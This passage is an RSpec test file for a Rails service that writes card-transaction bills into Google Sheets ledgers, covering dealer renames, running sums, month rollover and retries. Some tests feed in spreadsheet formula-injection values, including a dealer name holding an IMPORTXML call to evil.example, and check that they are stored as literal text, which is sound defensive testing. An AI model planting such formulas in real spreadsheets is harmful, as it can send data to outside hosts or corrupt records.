require "rails_helper"

RSpec.describe Workbook::HelloSmcWriter do
  let(:merchant) { create(:merchant, name: "001_ HỘ KINH DOANH THIÊN KIM GV", code: "001") }
  let(:chuong) { create(:dealer, name: "Chương") }
  let!(:link) do
    create(:merchant_dealer, merchant: merchant, dealer: chuong, tid_key: "tid1",
           ds_sheet_anchor: "Thiên Kim GV", ds_header: "Chương (tid1)", rd_agent_label: "Chương")
  end

  def ds_mb_grid
    [
      [ "Thiên Kim GV", "Chương (tid1)", "Sơn(tid2)", "Hải (tid3)" ],
      [ Date.new(2026, 10, 1), 354_367_000, 239_332_000, 117_362_000 ],
      [ Date.new(2026, 10, 2), 101_068_000, 746_622_000, nil ],
      [ Date.new(2026, 10, 3), nil, nil, nil ]
    ]
  end

  def mb_grid
    [ [ "Số tiền giao dịch", "Số tiền đã khấu trừ", "Số tiền sau khi trừ phí gốc", "Tỷ lệ",
        "Lợi nhuận", "Số Lô", "Ngày giao dịch", "Giờ giao dịch", "Tên đại lý", "Tên HKD", "Người đi tiền" ] ]
  end

  def memory(extra = {}, row_limits = {})
    Workbook::MemorySheet.new({
      "DS MB T10" => ds_mb_grid,
      "MB" => mb_grid
    }.merge(extra), row_limits)
  end

  # Same shape as the real DS MB sheet: dates down column A, amounts beside
  # them, a blank spacer row, then the "Tổng cộng" block of =sum formulas.
  def october_grid
    grid = [ [ "Thiên Kim GV", "Chương (tid1)", "Sơn(tid2)" ] ]
    (1..31).each do |day|
      grid << [ Date.new(2026, 10, day), (day == 1 ? 354_367_000 : nil), (day == 1 ? 239_332_000 : nil) ]
    end
    grid << []
    grid << [ "Tổng cộng", "Thiên Kim GV" ]
    grid << [ "Chương (tid1)", "=sum(B2:B32)" ]
    grid << [ "Sơn(tid2)", "=sum(C2:C32)" ]
    grid
  end

  def build_transaction(amount: 486_000, at: Time.zone.local(2026, 10, 1, 10, 0), rate: BigDecimal("0.0088"),
                        dealer_rate: BigDecimal("0.0121"), sender_id: 12_345, username: nil)
    message = create(:telegram_message, telegram_sender_id: sender_id, telegram_username: username)
    bill_image = create(:bill_image, telegram_message: message)
    create(:transaction, merchant: merchant, dealer: chuong, card_type: create(:normal_card_type),
           telegram_message: message, bill_image: bill_image,
           status: "approved", transaction_amount_vnd: amount, transaction_at: at,
           applied_base_fee_rate: rate, applied_dealer_rate: dealer_rate,
           amount_after_base_fee_vnd: (amount * (1 - rate)).round,
           lot_number: "000269",
           source_data: { "extraction" => { "merchant_name" => "HỘ KINH DOANH THIÊN KIM GV-1" } })
  end

  describe "identified transaction" do
    it "writes lot numbers as literal text, preserving zeros and refusing formula execution" do
      [ "000269", "=1+1", "+123", "@SUM(A1:A2)" ].each do |lot|
        client = memory
        transaction = build_transaction
        transaction.update!(lot_number: lot)
        allow(client).to receive(:batch_update_values).and_call_original

        expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
        expect(client).to have_received(:batch_update_values).with(satisfy { |updates|
          updates.find { |update| update[:sheet] == "MB" }[:rows].first[5] == "'#{lot}"
        })
        expect(client.cell("MB", "F2")).to eq(lot)
      end
    end

    it "reloads queued transactions and skips a bill that was put on hold" do
      stale = build_transaction
      Transaction.find(stale.id).update!(status: "hold")
      client = memory
      allow(client).to receive(:batch_update_values).and_call_original

      expect(described_class.call(transaction: stale, client: client, spreadsheet_id: "sheet-id")).to eq(:skipped_not_approved)
      expect(client).not_to have_received(:batch_update_values)
      expect(WorkbookEntry.where(transaction_id: stale.id)).not_to exist
    end

    it "writes DS MB and MB in a single batch and records the entry" do
      client = memory
      allow(client).to receive(:batch_update_values).and_call_original

      result = described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")

      expect(result).to eq(:identified)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(client.cell("MB", "A2")).to eq(486_000)
      expect(client.cell("MB", "I2")).to eq("Chương")
      expect(client.cell("MB", "J2")).to eq("001_ HỘ KINH DOANH THIÊN KIM GV")
      expect(client).to have_received(:batch_update_values).once
      expect(WorkbookEntry.count).to eq(1)
    end

    it "uses the day's row and leaves other days untouched" do
      client = memory
      described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 10, 2, 10, 0)),
                           client: client, spreadsheet_id: "sheet-id")
      expect(client.cell("DS MB T10", "B3")).to eq("=101068000+486000")
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
    end

    it "never writes the remitter: MB column K stays empty and no thu chi tab is read" do
      create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
      client = memory("thu chi 110" => [ [ nil, "RIMITTER" ], [ nil, "LẬP" ], [ "Chương", nil ], [ "TOTAL", "=SUM(B3:B3)" ] ])
      allow(client).to receive(:values).and_call_original

      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")

      expect(client.cell("MB", "K2")).to be_nil
      expect(client).not_to have_received(:values).with("thu chi 110", any_args)
      expect(client.cell("thu chi 110", "B3")).to be_nil
      expect(WorkbookEntry.last.payload).not_to have_key("remitter_id")
    end

    it "writes the agent name, not the fee dealer, to MB column I" do
      fee_dealer = create(:dealer, name: "Anh Trân")
      client = memory
      described_class.call(transaction: build_transaction.tap { |t| t.update!(dealer: fee_dealer) },
                           client: client, spreadsheet_id: "sheet-id")
      expect(client.cell("MB", "I2")).to eq("Chương")
    end
  end

  describe "DS MB header changes" do
    let(:lan) { create(:dealer, name: "Lan") }

    def renamed_grid(header)
      ds_mb_grid.tap { |grid| grid[0][1] = header }
    end

    def write(transaction, grid)
      client = memory("DS MB T10" => grid)
      [ described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"), client ]
    end

    def review_reason(transaction)
      transaction.reload
      expect(transaction).to be_needs_review
      expect(WorkbookEntry.where(transaction_id: transaction.id)).not_to exist
      transaction.source_data["review_reasons"].sole
    end

    before do
      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
    end

    it "writes into the column found by TID and remembers the new header when the same person was renamed" do
      transaction = build_transaction
      chuong.update!(name: "Chương Văn")

      result, client = write(transaction, renamed_grid("Chương Văn (tid1)"))

      expect(result).to eq(:identified)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(link.reload.ds_header).to eq("Chương Văn (tid1)")
      audit = AuditLog.find_by!(action: "merchant_dealer.ds_header_synced", auditable: link)
      expect(audit.metadata).to include("from" => "Chương (tid1)", "to" => "Chương Văn (tid1)", "sheet" => "DS MB T10",
                                        "source" => "writer", "transaction_id" => transaction.id)
    end

    it "does not touch ds_header or the audit trail when the header already matches" do
      write(build_transaction, ds_mb_grid)

      expect(link.reload.ds_header).to eq("Chương (tid1)")
      expect(AuditLog.where(action: "merchant_dealer.ds_header_synced")).to be_empty
    end

    it "gives the agent row and the bill to the dealer the header now names" do
      lan
      transaction = build_transaction(amount: 10_000_000)

      result, client = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:identified)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+10000000")
      expect(link.reload).to have_attributes(dealer: lan, ds_header: "Lan (tid1)")
      expect(transaction.reload).to have_attributes(dealer: lan, status: "approved")
      expect(client.cell("MB", "I2")).to eq("Lan")
      audit = AuditLog.find_by!(action: "merchant_dealer.agent_switched", auditable: link)
      expect(audit.metadata).to include("from_dealer" => "Chương", "to_dealer" => "Lan", "source" => "writer",
                                        "transaction_id" => transaction.id)
      expect(AuditLog.where(action: "transaction.dealer_reassigned", auditable: transaction)).to exist
    end

    it "keeps the dealer of a bill a person approved, while the agent row follows the header" do
      lan
      transaction = build_transaction
      transaction.update!(approved_by: create(:user, :operator))

      result, client = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:identified)
      expect(transaction.reload).to have_attributes(dealer: chuong, applied_dealer_rate: BigDecimal("0.0121"))
      expect(link.reload.dealer).to eq(lan)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(AuditLog.where(action: "transaction.dealer_reassigned")).to be_empty
    end

    it "keeps the dealer a reviewer chose by hand when the header names another dealer" do
      lan
      transaction = build_transaction
      transaction.update!(approved_by: create(:user, :operator), source_data: transaction.source_data.merge(
        "dealer_resolution" => { "merchant_dealer_id" => link.id },
        "manual_corrections" => [ { "by" => create(:user, :operator).id, "fields" => [ "dealer_id" ] } ]
      ))

      write(transaction, renamed_grid("Lan (tid1)"))

      expect(transaction.reload.dealer).to eq(chuong)
    end

    it "sends the bill back to review for a name no dealer has, and writes nothing" do
      transaction = build_transaction

      result, client = write(transaction, renamed_grid("Minh Quân (tid1)"))

      expect(result).to eq(:needs_review)
      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
      expect(client.cell("MB", "A2")).to be_nil
      expect(link.reload).to have_attributes(dealer: chuong, ds_header: "Chương (tid1)")
      expect(AuditLog.where(action: "merchant_dealer.agent_switched")).to be_empty
    end

    it "does not switch dealers when the setting is off" do
      lan
      AppSetting.create!(key: "ds_header_auto_switch", value: "false")
      transaction = build_transaction

      result, = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:needs_review)
      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
      expect(link.reload.dealer).to eq(chuong)
      expect(transaction.reload.dealer).to eq(chuong)
    end

    it "still follows a plain rename when the setting is off" do
      AppSetting.create!(key: "ds_header_auto_switch", value: "false")
      chuong.update!(name: "Chương Văn")

      result, = write(build_transaction, renamed_grid("Chương Văn (tid1)"))

      expect(result).to eq(:identified)
      expect(link.reload.ds_header).to eq("Chương Văn (tid1)")
    end

    it "sends the bill back to review when it cannot move to the new dealer" do
      lan
      transaction = build_transaction
      FeeRule.update_all(active: false)

      result, = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:needs_review)
      expect(review_reason(transaction)).to eq("dealer_reassign_failed")
      expect(transaction.reload.dealer).to eq(chuong)
    end

    it "moves a bill evaluated before the agent row changed hands to the row's dealer" do
      transaction = build_transaction
      transaction.update!(source_data: transaction.source_data.merge(
        "dealer_resolution" => { "merchant_dealer_id" => link.id }
      ))
      link.update!(dealer: lan, ds_header: "Lan (tid1)")

      result, client = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:identified)
      expect(transaction.reload.dealer).to eq(lan)
      expect(client.cell("MB", "I2")).to eq("Lan")
    end

    it "treats a dealer the system set earlier as not chosen by hand" do
      transaction = build_transaction
      transaction.update!(source_data: transaction.source_data.merge(
        "dealer_resolution" => { "merchant_dealer_id" => link.id },
        "manual_corrections" => [ { "by" => nil, "fields" => [ "dealer_id" ] } ]
      ))
      link.update!(dealer: lan, ds_header: "Lan (tid1)")

      write(transaction, renamed_grid("Lan (tid1)"))

      expect(transaction.reload.dealer).to eq(lan)
    end

    it "changes no agent row when the bill cannot be written to DS MB anyway" do
      lan
      transaction = build_transaction(at: Time.zone.local(2026, 10, 20, 10, 0))

      result, = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:needs_review)
      expect(review_reason(transaction)).to eq("ds_cell_missing")
      expect(link.reload.dealer).to eq(chuong)
      expect(transaction.reload.dealer).to eq(chuong)
    end

    it "handles a whole switch: the first bill switches, a bill evaluated before it follows, later bills match" do
      lan
      grid = renamed_grid("Lan (tid1)")
      client = memory("DS MB T10" => grid)
      resolved = ->(bill) { bill.update!(source_data: bill.source_data.merge("dealer_resolution" => { "merchant_dealer_id" => link.id })) }
      first = build_transaction(amount: 1_000_000).tap(&resolved)
      evaluated_before = build_transaction(amount: 2_000_000).tap(&resolved)

      results = [ first, evaluated_before ].map do |bill|
        described_class.call(transaction: bill, client: client, spreadsheet_id: "sheet-id")
      end
      later = create(:transaction, :approved, merchant: merchant, dealer: lan, transaction_amount_vnd: 3_000_000,
                                              transaction_at: Time.zone.local(2026, 10, 1, 11, 0),
                                              applied_dealer_rate: BigDecimal("0.0121"), dealer_amount_vnd: 2_963_700,
                                              source_data: first.source_data)
      results << described_class.call(transaction: later, client: client, spreadsheet_id: "sheet-id")

      expect(results).to eq(%i[identified identified identified])
      expect([ first, evaluated_before, later ].map { |bill| bill.reload.dealer }).to all(eq(lan))
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+1000000+2000000+3000000")
      expect((2..4).map { |row| client.cell("MB", "I#{row}") }).to all(eq("Lan"))
      expect(AuditLog.where(action: "merchant_dealer.agent_switched").count).to eq(1)
      expect(AuditLog.where(action: "transaction.dealer_reassigned").count).to eq(2)
    end

    it "leaves a dealer chosen by hand in review alone" do
      transaction = build_transaction
      transaction.update!(source_data: transaction.source_data.merge(
        "dealer_resolution" => { "merchant_dealer_id" => link.id },
        "manual_corrections" => [ { "by" => create(:user, :operator).id, "fields" => [ "dealer_id" ] } ]
      ))
      link.update!(dealer: lan, ds_header: "Lan (tid1)")

      result, = write(transaction, renamed_grid("Lan (tid1)"))

      expect(result).to eq(:identified)
      expect(transaction.reload.dealer).to eq(chuong)
    end

    it "undoes the switch with the bill when the sheet write fails, and switches once on the retry" do
      lan
      transaction = build_transaction
      client = memory("DS MB T10" => renamed_grid("Lan (tid1)"))
      attempts = 0
      allow(client).to receive(:batch_update_values).and_wrap_original do |original, *args|
        attempts += 1
        raise Faraday::TimeoutError if attempts == 1

        original.call(*args)
      end

      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
        .to raise_error(Faraday::TimeoutError)
      expect(link.reload.dealer).to eq(chuong)
      expect(transaction.reload.dealer).to eq(chuong)
      expect(AuditLog.where(action: "merchant_dealer.agent_switched")).to be_empty

      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
      expect(link.reload.dealer).to eq(lan)
      expect(AuditLog.where(action: "merchant_dealer.agent_switched").count).to eq(1)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
    end
  end

  describe "DS MB running sum (formula)" do
    def write_with(cell_value)
      grid = ds_mb_grid.tap { |g| g[1][1] = cell_value }
      client = memory("DS MB T10" => grid)
      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
      client
    end

    it "starts an empty day cell as =amount" do
      expect(write_with(nil).cell("DS MB T10", "B2")).to eq("=486000")
    end

    it "appends to an existing running sum" do
      expect(write_with("=354367000+486000").cell("DS MB T10", "B2")).to eq("=354367000+486000+486000")
    end

    it "turns a typed number into a running sum" do
      expect(write_with(1000).cell("DS MB T10", "B2")).to eq("=1000+486000")
    end

    it "reads the cell as a formula and writes with USER_ENTERED" do
      client = memory
      allow(client).to receive(:values).and_call_original
      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
      expect(client).to have_received(:values).with("DS MB T10", "B2", value_render_option: "FORMULA")
    end

    it "turns a number typed as text with thousand separators into a running sum" do
      expect(write_with("354.367.000").cell("DS MB T10", "B2")).to eq("=354367000+486000")
    end

    it "sends the bill back to review when the day cell holds text it cannot add to" do
      client = write_with("ghi chú")

      expect(client.cell("DS MB T10", "B2")).to eq("ghi chú")
      expect(client.cell("MB", "A2")).to be_nil
      expect(WorkbookEntry.count).to eq(0)
      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
    end

    it "does not add to a formula that is not a plain running sum" do
      client = write_with("=SUM(C2:D2)")

      expect(client.cell("DS MB T10", "B2")).to eq("=SUM(C2:D2)")
      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
    end

    it "clears last month's running sums when it builds a new month" do
      grid = october_grid.tap { |g| g[1][1] = "=354367000+486000" }
      client = memory("DS MB T10" => grid)
      described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 11, 3, 10, 0)),
                           client: client, spreadsheet_id: "sheet-id")

      expect(client.cell("DS MB T11", "B2")).to be_nil
      expect(client.cell("DS MB T11", "B35")).to eq("=sum(B2:B32)")
    end
  end

  describe "bill the writer cannot place" do
    # No TID on the bill, and its dealer has no agent row in the HKD to fall back on.
    def unknown_tid_transaction
      build_transaction.tap do |transaction|
        transaction.update!(dealer: create(:dealer, name: "Không có cột"),
                            source_data: { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } })
      end
    end

    it "writes nothing and sends the bill back to review with the reason" do
      client = memory
      allow(client).to receive(:batch_update_values).and_call_original
      transaction = unknown_tid_transaction

      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)

      expect(client).not_to have_received(:batch_update_values)
      expect(WorkbookEntry.count).to eq(0)
      transaction.reload
      expect(transaction).to be_needs_review
      expect(transaction.review_reason_codes).to eq([ "agent_tid_missing" ])
      expect(transaction.open_review.reason_codes).to eq([ "agent_tid_missing" ])
      expect(AuditLog.find_by!(action: "transaction.sent_to_review", auditable: transaction).metadata)
        .to eq("issue" => "agent_tid_missing")
    end

    it "replaces the reasons settled at approval with the writer's reason" do
      transaction = unknown_tid_transaction
      transaction.update!(source_data: transaction.source_data.merge("review_reasons" => [ "merchant_low_confidence" ]))

      described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-id")

      expect(transaction.reload.review_reason_codes).to eq([ "agent_tid_missing" ])
    end

    it "writes a bill without TID into the only column of the dealer it was approved with" do
      transaction = build_transaction
      transaction.update!(source_data: { "extraction" => { "merchant_name" => "001: HỘ KINH DOANH THIÊN KIM" } })
      client = memory

      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(client.cell("MB", "I2")).to eq("Chương")
    end

    it "keeps the dealer a confirmed QR paid when a person approves the bill again" do
      lan = create(:dealer, name: "Lan")
      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
      transaction = build_transaction
      transaction.update!(source_data: transaction.source_data.merge("dealer_resolution" => { "merchant_dealer_id" => link.id }))
      DealerPaymentQr.create!(recorded_transaction: transaction, dealer: chuong, status: "confirmed", access_token: "paid")
      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })

      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)
      expect(transaction.reload.review_reason_codes).to eq([ "payment_qr_confirmed" ])
      expect(link.reload.dealer).to eq(lan)

      expect(Transactions::Approver.call(transaction: transaction, actor: create(:user, :operator))).to be(true)
      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)

      expect(transaction.reload.dealer).to eq(chuong)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(client.cell("MB", "I2")).to eq("Lan") # column I names the agent of the column, as before
      expect(AuditLog.where(action: "transaction.dealer_reassigned")).to be_empty
    end

    it "is written once the configuration is fixed and the bill approved again" do
      transaction = build_transaction
      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
      expect(transaction.reload).to be_needs_review

      lan = create(:dealer, name: "Lan")
      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
      reviewer = create(:user, :operator)
      expect(Transactions::Corrector.call(transaction: transaction, actor: reviewer, params: { "dealer_id" => lan.id })).to be_success
      expect(Transactions::Approver.call(transaction: transaction, actor: reviewer)).to be(true)

      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
      expect(transaction.reload.dealer).to eq(lan)
      expect(link.reload.dealer).to eq(lan)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
    end

    it "keeps the dealer the reviewer left on the bill when it is approved again" do
      transaction = build_transaction
      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
      create(:dealer, name: "Lan")
      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
      Transactions::Approver.call(transaction: transaction.reload, actor: create(:user, :operator))

      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
      expect(transaction.reload.dealer).to eq(chuong)
    end
  end

  describe "MB totals row" do
    def bill_row(amount, marker)
      [ amount, "=A2-(A2*D2)", nil, 0.014, nil, "000001", "14/10/2026", "10:00:00", "Chương", "001", nil, marker ]
    end

    def write(client)
      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
    end

    it "inserts the bill above the totals row and stretches its sums" do
      totals = [ "=sum(A2:A3)", 2_000, nil, nil, "=SUM(E2:E3)" ]
      client = memory("MB" => mb_grid + [ bill_row(1_000, "TX900"), bill_row(1_000, "TX901"), totals ])
      allow(client).to receive(:insert_row).and_call_original

      write(client)

      expect(client).to have_received(:insert_row).with("MB", row: 3)
      expect(client.cell("MB", "A4")).to eq(486_000)
      expect(client.cell("MB", "L4")).to start_with("TX")
      expect(client.cell("MB", "A5")).to eq("=sum(A2:A4)")
      expect(client.cell("MB", "E5")).to eq("=SUM(E2:E4)")
      expect(client.cell("MB", "B5")).to eq(2_000)
      expect(WorkbookEntry.sole.mb_row).to eq(4)
    end

    it "reuses an empty row left above the totals by a failed attempt" do
      client = memory("MB" => mb_grid + [ bill_row(1_000, "TX900"), [], [ "=sum(A2:A2)" ] ])
      allow(client).to receive(:insert_row).and_call_original

      write(client)

      expect(client).not_to have_received(:insert_row)
      expect(client.cell("MB", "A3")).to eq(486_000)
      expect(client.cell("MB", "A4")).to eq("=sum(A2:A3)")
    end

    it "appends at the end when the totals row is not the last row" do
      client = memory("MB" => mb_grid + [ bill_row(1_000, "TX900"), [ "=sum(A2:A2)" ], bill_row(1_000, "TX901") ])
      allow(client).to receive(:insert_row).and_call_original

      write(client)

      expect(client).not_to have_received(:insert_row)
      expect(client.cell("MB", "A5")).to eq(486_000)
      expect(client.cell("MB", "A3")).to eq("=sum(A2:A2)")
    end
  end

  describe "idempotency and guards" do
    it "returns :already_written when an entry already exists" do
      transaction = build_transaction
      client = memory
      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
        .to eq(:already_written)
      expect(WorkbookEntry.count).to eq(1)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
    end

    it "skips failed transactions" do
      transaction = build_transaction
      transaction.update!(status: "failed")
      client = memory
      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
        .to eq(:skipped_failed)
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
    end

    it "skips transactions that are not approved yet" do
      %w[needs_review hold].each do |status|
        transaction = build_transaction
        transaction.update!(status: status)
        expect(described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-id"))
          .to eq(:skipped_not_approved)
      end
      expect(WorkbookEntry.count).to eq(0)
    end

    it "skips rejected transactions" do
      transaction = build_transaction
      transaction.update!(status: "rejected")
      client = memory
      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
        .to eq(:skipped_rejected)
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
      expect(WorkbookEntry.count).to eq(0)
    end

    it "raises ConfigurationError when the spreadsheet id is missing" do
      expect { described_class.call(transaction: build_transaction, client: memory, spreadsheet_id: nil) }
        .to raise_error(Workbook::HelloSmcWriter::ConfigurationError)
    end
  end

  describe "month rollover" do
    let(:november) { Time.zone.local(2026, 11, 3, 10, 0) }

    it "builds the new month, clears last month's amounts and keeps the totals formulas" do
      client = memory("DS MB T10" => october_grid)
      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")

      expect(client.titles).to include("DS MB T11")
      expect(client.titles.grep(/__setup_/)).to be_empty
      expect(client.cell("DS MB T11", "A2")).to eq(Date.new(2026, 11, 1))
      expect(client.cell("DS MB T11", "A31")).to eq(Date.new(2026, 11, 30))
      expect(client.cell("DS MB T11", "A32")).to be_nil
      expect(client.cell("DS MB T11", "B2")).to be_nil
      expect(client.cell("DS MB T11", "C2")).to be_nil
      expect(client.cell("DS MB T11", "B4")).to eq("=486000")
      expect(client.cell("DS MB T11", "B35")).to eq("=sum(B2:B32)")
      expect(client.cell("DS MB T11", "A35")).to eq("Chương (tid1)")
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
    end

    it "does not mistake small amounts for dates" do
      grid = october_grid
      grid[1][2] = 52_000
      client = memory("DS MB T10" => grid)
      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")
      expect(client.cell("DS MB T11", "C2")).to be_nil
    end

    it "leaves no half-built month behind when the setup fails, and finishes on retry" do
      client = memory("DS MB T10" => october_grid)
      attempts = 0
      allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
        attempts += 1
        raise Google::Apis::TransmissionError, "boom" if attempts == 1

        original.call(updates)
      end
      transaction = build_transaction(at: Time.zone.local(2026, 11, 1, 10, 0))

      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
        .to raise_error(Google::Apis::TransmissionError)
      expect(client.titles).not_to include("DS MB T11")

      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
      expect(client.titles).to include("DS MB T11")
      expect(client.titles.grep(/__setup_/)).to be_empty
      expect(client.cell("DS MB T11", "B2")).to eq("=486000")
      expect(WorkbookEntry.count).to eq(1)
    end

    it "keeps day 31 available when December is cloned from a 30-day November" do
      client = memory("DS MB T10" => october_grid)
      described_class.call(transaction: build_transaction(at: november), client: client, spreadsheet_id: "sheet-id")
      described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 12, 31, 10, 0)),
                           client: client, spreadsheet_id: "sheet-id")

      expect(client.cell("DS MB T12", "A32")).to eq(Date.new(2026, 12, 31))
      expect(client.cell("DS MB T12", "B32")).to eq("=486000")
    end
  end

  describe "ledger rows" do
    it "fills a blank row in the middle of MB instead of overwriting the row below" do
      rows = mb_grid + [ [ 1000 ], [ 2000 ], [ 3000 ], [ 4000 ] ]
      rows[2] = []
      client = memory("MB" => rows)

      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")

      expect(client.cell("MB", "A3")).to eq(486_000)
      expect(client.cell("MB", "A4")).to eq(3000)
      expect(WorkbookEntry.last.mb_row).to eq(3)
    end

    it "adds rows when MB is full instead of failing with a grid limit error" do
      rows = mb_grid + (2..1000).map { |n| [ n ] }
      client = memory({ "MB" => rows }, { "MB" => 1000 })

      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")

      expect(client.cell("MB", "A1001")).to eq(486_000)
      expect(WorkbookEntry.last.mb_row).to eq(1001)
    end

    it "writes the transaction marker and dates as literal text" do
      client = memory
      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
      expect(client.cell("MB", "L2")).to match(/\ATX\d+\z/)
      expect(client.cell("MB", "G2")).to eq("01/10/2026")
      expect(client.cell("MB", "H2")).to eq("10:00:00")
    end

    it "does not add the amount twice when the batch was applied but the entry was not saved" do
      client = memory
      transaction = build_transaction
      calls = 0
      allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
        calls += 1
        raise ActiveRecord::StatementInvalid, "db down" if calls == 1

        original.call(*args)
      end

      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
        .to raise_error(ActiveRecord::StatementInvalid)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")

      result = described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")

      expect(result).to eq(:already_written)
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
      expect(client.cell("MB", "A3")).to be_nil
      expect(WorkbookEntry.count).to eq(1)
      expect(WorkbookEntry.last.payload["issue"]).to eq("reconciled_after_retry")
    end

    it "writes names that look like a formula as literal text" do
      client = memory
      sent = nil
      allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
        sent = updates
        original.call(updates)
      end
      chuong.update!(name: "=IMPORTXML(\"http://evil.example\",\"//a\")")

      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")

      mb_row = sent.find { |update| update[:sheet] == "MB" }[:rows].first
      expect(mb_row[8]).to start_with("'=IMPORTXML")
      expect(client.cell("MB", "I2")).to start_with("=IMPORTXML")
    end
  end

  describe "daily cell lookup" do
    it "never falls through into the table stacked below when the day is missing" do
      grid = [
        [ "Thiên Kim GV", "Chương (tid1)" ],
        [ Date.new(2026, 10, 1), 100 ],
        [ "Tổng cộng", "Thiên Kim GV" ],
        [],
        [ "HKD AS CAFE", "Anh Hải (tid 1)" ],
        [ Date.new(2026, 10, 1), 200 ],
        [ Date.new(2026, 10, 2), 300 ]
      ]
      client = memory("DS MB T10" => grid)

      result = described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 10, 2, 10, 0)),
                                    client: client, spreadsheet_id: "sheet-id")

      expect(result).to eq(:needs_review)
      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_missing" ])
      expect(client.cell("DS MB T10", "B7")).to eq(300)
    end
  end

  describe "serialized accumulation" do
    it "accumulates two transactions into the same daily cell without losing an update" do
      client = memory
      described_class.call(transaction: build_transaction(amount: 100_000), client: client, spreadsheet_id: "sheet-id")
      described_class.call(transaction: build_transaction(amount: 200_000), client: client, spreadsheet_id: "sheet-id")
      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+100000+200000")
      expect(client.values("DS MB T10", "B2").first.first).to eq(354_367_000 + 100_000 + 200_000)
    end

